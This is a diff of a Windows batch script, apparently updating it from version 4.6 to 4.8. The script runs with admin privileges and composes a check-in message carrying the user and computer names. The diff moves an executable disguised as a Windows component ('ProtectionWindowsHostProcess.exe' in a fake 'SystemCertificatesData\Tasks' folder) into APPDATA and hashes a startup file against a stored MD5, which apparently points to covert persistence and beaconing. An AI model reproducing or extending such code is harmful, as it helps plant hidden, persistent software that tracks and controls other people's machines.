@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=4.6"
+set "BATCHVERSION=4.8"
 set "RESULT=%TEMP%\TUSELMP.txa"
 
 
@@ -160,7 +160,7 @@ goto :LogOutput
 
 :SENDINGLASTMSG
 echo SENDINGLASTMSG Started.. >> "%LOGFILE%" 2>&1
-set "RESULT=%TEMP%\TGRESU.txa"
+set "RESULT=%TEMP%\TUSELMP.txa"
 del /f /q "%RESULT%" >> "%LOGFILE%" 2>&1
 
 set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|LoggedIn(1)|%MESSAGEEVERY%|%time%|(v%BATCHVERSION%)"
@@ -241,7 +241,7 @@ set "file7=%TEMP%\7z.exe"
 set "file8=%TEMP%\7z.dll"
 set "file9=%SystemRoot%\System32\handle.exe"
 set "file10=%SystemRoot%\System32\wudtest.exe"
-set "file11=%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
+set "file11=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
 
 
 echo Typing  >> "%LOGFILE%" 2>&1
@@ -384,12 +384,7 @@ echo. >> "%LOGFILE%" 2>&1
 timeout /t 5 /nobreak >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 
-::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
-::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
-::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
-::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
-::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
-::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+
 
 
 echo. >> "%LOGFILE%" 2>&1
@@ -398,8 +393,8 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 
-for /f "tokens=*" %%A in ('certutil -hashfile "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
-echo MD5 of "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" = %RUNEVERYCURRENTMD5% >> "%LOGFILE%" 2>&1
+for /f "tokens=*" %%A in ('certutil -hashfile "%startupFile%" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
+echo MD5 of "%startupFile%" = %RUNEVERYCURRENTMD5% >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
